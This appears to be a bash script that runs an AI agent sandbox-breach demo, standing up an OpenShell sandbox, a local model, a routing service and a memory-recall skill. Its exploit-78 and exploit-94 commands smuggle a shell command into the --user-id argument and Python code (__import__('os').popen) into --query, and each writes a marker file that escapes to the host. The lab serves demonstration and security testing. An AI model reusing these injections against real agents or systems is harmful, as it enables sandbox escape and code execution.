#!/bin/bash
# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#
# Orchestrates the sandbox-breach demo's persistent services and the sandbox itself.
# This script does NOT replace watching it happen live across the terminals in
# terminals.md -- it exists so standing the stack up (or tearing it down) is one
# command instead of the eleven manual steps in README.md's "Reproducing this"
# section, which remains the authoritative reference if this script and reality
# ever disagree.
#
# Usage:
#   ./run.sh up          # start memory-mcp, Dynamo/Qwen, roundhouse (idempotent)
#   ./run.sh sandbox      # create/attach the OpenShell sandbox (idempotent)
#   ./run.sh exploit-78    # run the CWE-78 exploit from inside the sandbox
#   ./run.sh exploit-94    # run the CWE-94 exploit from inside the sandbox
#   ./run.sh relay "<prompt>"  # run a prompt through claude -> NeMo Relay -> roundhouse
#   ./run.sh status        # print status of every component
#   ./run.sh down          # tear down the sandbox + roundhouse + Dynamo + memory-mcp

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BREAKOUT_LAB="${BREAKOUT_LAB:-/home/ubuntu/breakout-lab}"
DYNAMO_CLONE="${DYNAMO_CLONE:-/home/ubuntu/dynamo}"
ROUNDHOUSE_BIN="${ROUNDHOUSE_BIN:-${HERE}/../../target/release/roundhouse}"
SANDBOX_NAME="${SANDBOX_NAME:-sandbox-breach-demo}"
LOCAL_MODEL="${LOCAL_MODEL:-Qwen/Qwen2.5-7B-Instruct}"

turn_key() {
  python3 -c "import json,sys; print(json.load(open('${HERE}/keys.local.json'))['$1'])"
}

cmd_up() {
  echo "[*] memory-mcp (breakout-lab, outside the sandbox)"
  ( cd "${BREAKOUT_LAB}/openshell" && docker compose --env-file ../.env -f docker-compose.memory-mcp.yml up -d --build )

  echo "[*] Dynamo/Qwen local worker"
  if ! curl -sf -o /dev/null http://127.0.0.1:8000/v1/models; then
    docker start dev-etcd-server-1 dev-nats-server-1 >/dev/null 2>&1 || true
    ( source "${DYNAMO_CLONE}/.venv/bin/activate" && \
      cd "${HERE}/../cache-aware-routing" && \
      MODEL="${LOCAL_MODEL}" nohup bash ./serve_model.sh serve > /tmp/sandbox-breach-dynamo.log 2>&1 & )
    echo "    started in background, log: /tmp/sandbox-breach-dynamo.log (takes ~30-60s to come up)"
  else
    echo "    already serving on :8000"
  fi

  echo "[*] roundhouse (both legs)"
  if ! curl -sf -o /dev/null http://127.0.0.1:8080/v1/metrics -H "x-roundhouse-key: $(turn_key __admin__)"; then
    TOKENIZER_DIR="$(find ~/.cache/huggingface/hub -maxdepth 1 -iname "models--${LOCAL_MODEL//\//--}" 2>/dev/null | head -1)"
    TOKENIZER="$(find "${TOKENIZER_DIR}" -iname tokenizer.json 2>/dev/null | head -1)"
    INFERENCE_API_KEY="$(grep INFERENCE_API_KEY "${BREAKOUT_LAB}/.env" | cut -d= -f2)" \
    ROUNDHOUSE_CATALOG="${HERE}/catalog.json" \
    ROUNDHOUSE_CONTROL_PLANE="${HERE}/control-plane.json" \
    ROUNDHOUSE_ADDR=0.0.0.0:8080 \
    ROUNDHOUSE_FRONTIER_UPSTREAM=openai_responses \
    ROUNDHOUSE_LOCAL_ENDPOINT=http://127.0.0.1:8000 \
    ROUNDHOUSE_LOCAL_MODEL="${LOCAL_MODEL}" \
    ROUNDHOUSE_LOCAL_TOKENIZER="${TOKENIZER}" \
    ROUNDHOUSE_LOCAL_KV_EVENTS_ENDPOINT=tcp://127.0.0.1:20080 \
    nohup "${ROUNDHOUSE_BIN}" > /tmp/sandbox-breach-roundhouse.log 2>&1 &
    echo "    started in background, log: /tmp/sandbox-breach-roundhouse.log"
  else
    echo "    already listening on :8080"
  fi
}

cmd_sandbox() {
  if openshell sandbox list 2>/dev/null | grep -q "^${SANDBOX_NAME}\b"; then
    echo "[*] sandbox ${SANDBOX_NAME} already exists"
    return
  fi
  openshell provider profile import -f "${HERE}/openshell-roundhouse-provider.yaml" --global 2>/dev/null || \
    openshell provider profile update roundhouse -f "${HERE}/openshell-roundhouse-provider.yaml" --global
  openshell provider create --name roundhouse --type roundhouse \
    --credential "ANTHROPIC_API_KEY=rh_sentinel_not_a_credential" 2>/dev/null || true
  TURN_KEY="$(turn_key sandbox-breach-frontier/openclaw-frontier)"
  openshell sandbox create --name "${SANDBOX_NAME}" \
    --from ghcr.io/nvidia/openshell-community/sandboxes/base:latest \
    --provider roundhouse \
    --policy "${HERE}/openshell-sandbox-policy.yaml" \
    --env "ANTHROPIC_BASE_URL=http://host.openshell.internal:8080" \
    --env "ANTHROPIC_CUSTOM_HEADERS=x-roundhouse-key: ${TURN_KEY}" \
    --no-credential-warnings --detach
  echo "[*] installing memory-recall skill + fastmcp"
  openshell sandbox upload "${SANDBOX_NAME}" \
    "${BREAKOUT_LAB}/openshell/skills/memory-recall" /sandbox/.claude/skills/memory-recall
  openshell sandbox exec -n "${SANDBOX_NAME}" -- /sandbox/.venv/bin/python3 -m pip install -q fastmcp
}

cmd_exploit_78() {
  local nonce; nonce="sbdemo$(date +%s)"
  openshell sandbox exec -n "${SANDBOX_NAME}" \
    --workdir /sandbox/.claude/skills/memory-recall/memory-recall -- \
    /sandbox/.venv/bin/python3 recall.py --tool memory_agent \
    --query "hello, this is a benign memory query" \
    --user-id "ruth; echo 'MARKINJECT_BREAKOUT_${nonce}' > /workspace/mnt/MARKINJECT_BREAKOUT_${nonce} #" || true
  echo "[*] checking host marker..."
  cat "${BREAKOUT_LAB}/openshell/host_breakout_marker/MARKINJECT_BREAKOUT_${nonce}" 2>&1
}

cmd_exploit_94() {
  local nonce; nonce="sbdemo$(date +%s)"
  openshell sandbox exec -n "${SANDBOX_NAME}" \
    --workdir /sandbox/.claude/skills/memory-recall/memory-recall -- \
    /sandbox/.venv/bin/python3 recall.py --tool fetch_memory_items \
    --query "=[__import__('os').popen(\"mkdir -p /workspace/mnt && echo MARKINJECT_BREAKOUT_${nonce} > /workspace/mnt/MARKINJECT_BREAKOUT_${nonce}\").read()]" \
    --user-id ruth
  echo "[*] checking host marker..."
  cat "${BREAKOUT_LAB}/openshell/host_breakout_marker/MARKINJECT_BREAKOUT_${nonce}" 2>&1
}

cmd_relay() {
  local prompt="${1:?usage: run.sh relay \"<prompt>\"}"
  local TURN_KEY; TURN_KEY="$(turn_key sandbox-breach-frontier/openclaw-frontier)"
  openshell sandbox exec -n "${SANDBOX_NAME}" -- /sandbox/.venv/bin/pip install -q "nemo-relay[cli]" 2>/dev/null || true
  openshell sandbox exec -n "${SANDBOX_NAME}" -- sh -c \
    'mkdir -p /sandbox/.relay && [ -f /sandbox/.relay/config.toml ] || printf "[agents.claude]\n" > /sandbox/.relay/config.toml'
  openshell sandbox exec -n "${SANDBOX_NAME}" --env "ANTHROPIC_CUSTOM_HEADERS=x-roundhouse-key: ${TURN_KEY}" -- \
    /sandbox/.venv/bin/nemo-relay --log-stderr-format jsonl run --agent claude \
      --config /sandbox/.relay/config.toml \
      --anthropic-base-url http://host.openshell.internal:8080 \
      --print -- -p "${prompt}" || true
}

cmd_status() {
  echo "=== memory-mcp ===" ; docker ps --format '{{.Names}}\t{{.Status}}' | grep memory-mcp || echo "not running"
  echo "=== Dynamo/Qwen ===" ; curl -sf -o /dev/null -w "http %{http_code}\n" http://127.0.0.1:8000/v1/models || echo "not running"
  echo "=== roundhouse ===" ; curl -sf -o /dev/null -w "http %{http_code}\n" http://127.0.0.1:8080/v1/metrics -H "x-roundhouse-key: $(turn_key __admin__)" || echo "not running"
  echo "=== OpenShell sandbox ===" ; openshell sandbox list 2>&1
}

cmd_down() {
  openshell sandbox delete "${SANDBOX_NAME}" 2>&1 || true
  pkill -f "target/release/roundhouse" 2>&1 || true
  pkill -f "dynamo.vllm\|dynamo.frontend" 2>&1 || true
  ( cd "${BREAKOUT_LAB}/openshell" && docker compose -f docker-compose.memory-mcp.yml down ) || true
}

case "${1:-status}" in
  up) cmd_up ;;
  sandbox) cmd_sandbox ;;
  exploit-78) cmd_exploit_78 ;;
  exploit-94) cmd_exploit_94 ;;
  relay) shift; cmd_relay "$@" ;;
  status) cmd_status ;;
  down) cmd_down ;;
  *) echo "usage: $0 {up|sandbox|exploit-78|exploit-94|relay <prompt>|status|down}" >&2; exit 2 ;;
esac
